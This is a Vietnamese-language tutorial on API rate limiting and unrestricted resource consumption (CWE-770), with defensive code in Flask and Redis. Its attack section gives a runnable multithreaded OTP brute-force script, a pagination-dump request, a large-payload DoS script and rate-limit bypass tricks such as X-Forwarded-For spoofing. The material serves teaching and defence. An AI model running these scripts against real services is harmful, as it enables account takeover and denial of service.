# API Rate Limiting & Resource Abuse

> **CWE**: CWE-770 | **Phân loại**: API Security

## Kiến thức Nền tảng
Hãy tưởng tượng bạn mở một quầy phát quà miễn phí cho người dân. Nhận thấy có một số người tham lam xếp hàng nhận quà xong liền chạy ra sau xếp hàng lại để lấy tiếp hàng chục lần, khiến những người đến sau không có quà. Để giải quyết việc này, bạn quyết định cử một người bảo vệ đứng ở cửa để kiểm soát: "Mỗi người chỉ được phép nhận tối đa 1 phần quà trong vòng 1 tiếng".
Cơ chế kiểm soát tần suất này trong thế giới mạng chính là **Giới hạn lưu lượng (Rate Limiting)**. Đây là tấm khiên bảo vệ các cổng API của bạn trước những kẻ tham lam cố tình gửi hàng triệu yêu cầu liên tục để dò mật khẩu (brute force), làm sập máy chủ (DoS), hay vét sạch tài nguyên của hệ thống.

Để thực hiện việc này, người bảo vệ có thể áp dụng một số phương pháp:
- **Cửa sổ cố định (Fixed Window)**: Chia thời gian thành các khoảng cố định (ví dụ cứ đúng từ 8h00 đến 8h01 tối đa nhận 100 yêu cầu).
- **Cửa sổ trượt (Sliding Window)**: Linh hoạt hơn, tính lùi lại đúng 60 giây kể từ thời điểm hiện tại để đếm số yêu cầu đã gửi.
- **Thùng chứa mã báo hiệu (Token Bucket)**: Phát cho mỗi người dùng một chiếc xô tự động đầy dần theo thời gian. Mỗi khi gửi yêu cầu, họ phải nộp 1 chiếc thẻ (token) trong xô ra, nếu xô rỗng thì phải đợi thẻ tự động sinh thêm.
- **Thùng rò rỉ (Leaky Bucket)**: Giống như một chiếc xô bị thủng lỗ ở đáy. Yêu cầu đổ vào xô có thể dồn dập, nhưng nước chỉ chảy ra ở đáy với tốc độ đều đặn, nếu đổ vào quá nhanh làm tràn xô, những yêu cầu thừa sẽ bị loại bỏ.

Người bảo vệ này có thể đứng ở nhiều trạm gác khác nhau: ngay tại cổng ngõ vào hệ thống (API Gateway), tường lửa bảo vệ (WAF), hoặc ngay trong lòng ứng dụng (Middleware).

```python
# Simple token bucket rate limiter — normal operation
import time

class TokenBucket:
    def __init__(self, capacity, refill_rate):
        self.capacity = capacity          # Maximum tokens in bucket
        self.tokens = capacity            # Current available tokens
        self.refill_rate = refill_rate    # Tokens added per second
        self.last_refill = time.time()

    def allow_request(self):
        """Check if a request should be allowed"""
        self._refill()
        if self.tokens >= 1:
            self.tokens -= 1              # Consume one token
            return True                   # Request allowed
        return False                      # Rate limited — reject request

    def _refill(self):
        now = time.time()
        elapsed = now - self.last_refill
        self.tokens = min(self.capacity, self.tokens + elapsed * self.refill_rate)
        self.last_refill = now

# Usage: 10 requests per second
limiter = TokenBucket(capacity=10, refill_rate=10)
```

## Mô tả lỗ hổng
Lỗ hổng **Unrestricted Resource Consumption (Tiêu thụ tài nguyên không giới hạn)** xuất hiện khi hệ thống của bạn quá phóng khoáng và thiếu cảnh giác, cho phép khách hàng yêu cầu phục vụ những công việc cực kỳ tốn kém mà không có giới hạn nào.

Hãy tưởng tượng một vị khách vào nhà hàng và yêu cầu: "Hãy dọn cho tôi 1 triệu đĩa thức ăn cùng lúc" (Pagination abuse) hoặc gửi một yêu cầu dài hàng trang giấy chỉ để ghi một dòng chữ nhỏ (Large payload DoS). Nếu nhà hàng cố phục vụ, nhà bếp sẽ ngay lập tức tê liệt vì quá tải.
Lỗ hổng này mở ra vô vàn hiểm họa:
- Kẻ tấn công thoải mái gửi hàng triệu yêu cầu dò mã OTP hay mật khẩu mà không bao giờ bị chặn.
- Yêu cầu máy chủ xuất ra hàng triệu dòng dữ liệu cùng lúc, khiến RAM máy chủ quá tải và sập nguồn (OOM).
- Gửi các file hoặc gói dữ liệu khổng lồ để làm tràn bộ nhớ máy chủ.
- Chi phí vận hành máy chủ đám mây (cloud) tăng vọt chóng mặt do tài nguyên bị lạm dụng vô tội vạ, tạo nên cú sốc hóa đơn cho doanh nghiệp.

## Cơ chế tấn công
**1. Brute force OTP — No rate limit on verification:**

```python
# Attacker brute-forces 6-digit OTP — only 1 million possibilities
import requests
import concurrent.futures

TARGET = "https://api.target.com/verify-otp"
HEADERS = {"Authorization": "Bearer stolen_token"}

def try_otp(otp):
    """Try a single OTP code"""
    response = requests.post(TARGET, json={
        "otp": f"{otp:06d}"  # Format as 6-digit string: 000000 to 999999
    }, headers=HEADERS)
    if response.status_code == 200:
        return otp, response.json()
    return None

# Parallel brute force — 50 threads, ~1M attempts in minutes
with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
    futures = {executor.submit(try_otp, i): i for i in range(1000000)}
    for future in concurrent.futures.as_completed(futures):
        result = future.result()
        if result:
            print(f"[SUCCESS] OTP found: {result[0]:06d}")
            break
```

**2. Pagination abuse — Dump entire database:**

```http
# Normal request — returns 20 records
GET /api/users?page=1&page_size=20 HTTP/1.1

# Attacker's request — requests ALL records at once
GET /api/users?page=1&page_size=9999999 HTTP/1.1

# Server loads millions of records into memory → OOM crash
# Or: attacker receives full user dump including sensitive fields
```

**3. Large payload DoS — Exhausting server memory:**

```python
# Send extremely large JSON payload to exhaust server memory
import requests

# 100MB JSON payload — server tries to parse entire body into memory
huge_payload = {"data": "A" * (100 * 1024 * 1024)}

response = requests.post(
    "https://api.target.com/import",
    json=huge_payload,
    headers={"Content-Type": "application/json"}
)
# Server: json.loads() on 100MB string → memory spike → crash
```

**4. Rate limit bypass techniques:**

```http
# Bypass IP-based rate limiting by rotating identifiers

# Technique 1: IP rotation via headers
GET /api/login HTTP/1.1
X-Forwarded-For: 1.2.3.4          # Proxy trusts this header for IP identification
X-Real-IP: 5.6.7.8                # Different "IP" for each request

# Technique 2: Endpoint variation (same handler, different path)
POST /api/v1/login HTTP/1.1       # Rate limited
POST /API/V1/LOGIN HTTP/1.1       # Same endpoint, different case — may bypass
POST /api/v1/login/ HTTP/1.1      # Trailing slash — different rate limit bucket
POST /api/v1/login?dummy=1 HTTP/1.1  # Query param — different cache key

# Technique 3: Parameter pollution
POST /api/login HTTP/1.1
{"username":"admin","password":"test1","password":"test2"}
# Some parsers process both values, doubling attempts per request
```

## Biện pháp phòng thủ
```python
# Multi-dimensional rate limiting with Redis
import redis
from functools import wraps
from flask import request, jsonify
r = redis.Redis()
def rate_limit(max_requests, window_seconds, key_func):
    """Rate limit decorator with configurable key function"""
    def decorator(f):
        @wraps(f)
        def wrapper(*args, **kwargs):
            # Build composite rate limit key
            key = f"ratelimit:{request.endpoint}:{key_func()}"
            current = r.incr(key)
            if current == 1:
                r.expire(key, window_seconds)
            if current > max_requests:
                return jsonify({"error": "Rate limit exceeded"}), 429
            return f(*args, **kwargs)
        return wrapper
    return decorator
# Apply: 5 OTP attempts per 15 minutes, keyed by user ID
@app.route('/verify-otp', methods=['POST'])
@rate_limit(max_requests=5, window_seconds=900,
            key_func=lambda: request.json.get('user_id', request.remote_addr))
def verify_otp():
    pass
```
```python
# Enforce maximum page size and request body limits
@app.route('/api/users')
def list_users():
    page = max(1, request.args.get('page', 1, type=int))
    page_size = request.args.get('page_size', 20, type=int)
    page_size = min(page_size, 100)  # CAP at 100 — never allow more
    users = db.users.find().skip((page - 1) * page_size).limit(page_size)
    return jsonify(users)
# Limit request body size at framework level
app.config['MAX_CONTENT_LENGTH'] = 1 * 1024 * 1024  # 1MB max body size
```
```http
HTTP/1.1 200 OK
X-RateLimit-Limit: 100
X-RateLimit-Remaining: 42
X-RateLimit-Reset: 1625097600
Retry-After: 30
```

- **Tóm tắt**: Bảo vệ API khỏi lạm dụng tài nguyên bằng cách giới hạn tần suất theo nhiều chiều (IP, User ID), giới hạn kích thước payload và kích thước phân trang.
- **Các bước chi tiết**:
  - **Rate limit theo nhiều dimension** — IP + User ID + Endpoint:
  - **Giới hạn pagination và payload size:**
  - **Trả về rate limit headers** để client biết giới hạn:
  - **Normalize URL/method** trước khi áp dụng rate limit — tránh bypass bằng case variation.
  - **Không tin tưởng `X-Forwarded-For`** từ client — chỉ dùng IP từ trusted proxy.

## Code Example
```python
# === VULNERABLE: No rate limit, no pagination cap, no body limit ===
@app.route('/api/login', methods=['POST'])
def login():
    data = request.get_json()  # No body size limit!
    user = db.users.find_one({"email": data['email']})
    if user and check_password(data['password'], user['password']):
        return jsonify({"token": generate_token(user)})
    return jsonify({"error": "Invalid credentials"}), 401
    # No rate limit — attacker can try millions of passwords

# === SECURE: Rate limited, body limited, account lockout ===
@app.route('/api/login', methods=['POST'])
@rate_limit(max_requests=5, window_seconds=300,
            key_func=lambda: request.json.get('email', ''))
def login_secure():
    data = request.get_json(force=False, silent=True)
    if not data or len(request.data) > 1024:  # Reject oversized bodies
        return jsonify({"error": "Invalid request"}), 400

    email = data.get('email', '')
    lockout_key = f"lockout:{email}"

    # Check if account is locked
    if r.get(lockout_key):
        return jsonify({"error": "Account temporarily locked"}), 423

    user = db.users.find_one({"email": email})
    if user and check_password(data['password'], user['password']):
        r.delete(f"failed:{email}")  # Reset failed counter on success
        return jsonify({"token": generate_token(user)})

    # Track failed attempts — lock after 10 failures
    failures = r.incr(f"failed:{email}")
    r.expire(f"failed:{email}", 3600)
    if failures >= 10:
        r.setex(lockout_key, 1800, "locked")  # Lock for 30 minutes
    return jsonify({"error": "Invalid credentials"}), 401
```

## Xem thêm
- [Các bài học liên quan trong cùng thư mục](../)

## Nguồn tham khảo
- OWASP: https://owasp.org/API-Security/editions/2023/en/0xa4-unrestricted-resource-consumption/
- PortSwigger: https://portswigger.net/web-security/authentication/password-based
- CWE: https://cwe.mitre.org/data/definitions/770.html
- IETF Rate Limiting: https://datatracker.ietf.org/doc/draft-ietf-httpapi-ratelimit-headers/

## Giải thích thuật ngữ
- **Rate Limiting (Giới hạn lưu lượng)**: Cơ chế kiểm soát và giới hạn số lượng yêu cầu mà một người dùng có thể gửi lên hệ thống trong một khoảng thời gian.
- **API Gateway**: Máy chủ trung gian đóng vai trò là cửa ngõ đầu tiên tiếp nhận và định tuyến các yêu cầu API từ bên ngoài vào hệ thống.
- **Middleware**: Các đoạn mã trung gian nằm giữa luồng tiếp nhận yêu cầu và xử lý logic chính của ứng dụng, chuyên dùng để kiểm tra quyền truy cập hoặc áp dụng rate limit.
- **Token**: Thẻ định danh hoặc thẻ quyền hạn được sử dụng để thực hiện các yêu cầu trong thuật toán Token Bucket.
- **Credential Stuffing**: Phương thức tấn công sử dụng danh sách tài khoản/mật khẩu bị rò rỉ từ các nguồn khác để thử đăng nhập tự động trên diện rộng.
- **Pagination (Phân trang)**: Kỹ thuật chia nhỏ danh sách kết quả trả về từ database thành nhiều trang nhỏ để tăng hiệu suất hiển thị.
- **Bill Shock**: Chi phí hóa đơn dịch vụ đám mây tăng đột biến ngoài tầm kiểm soát do tài nguyên hệ thống bị tiêu thụ quá mức.
- **Account Lockout**: Cơ chế tạm khóa tài khoản sau một số lần đăng nhập sai liên tiếp để chống brute force.
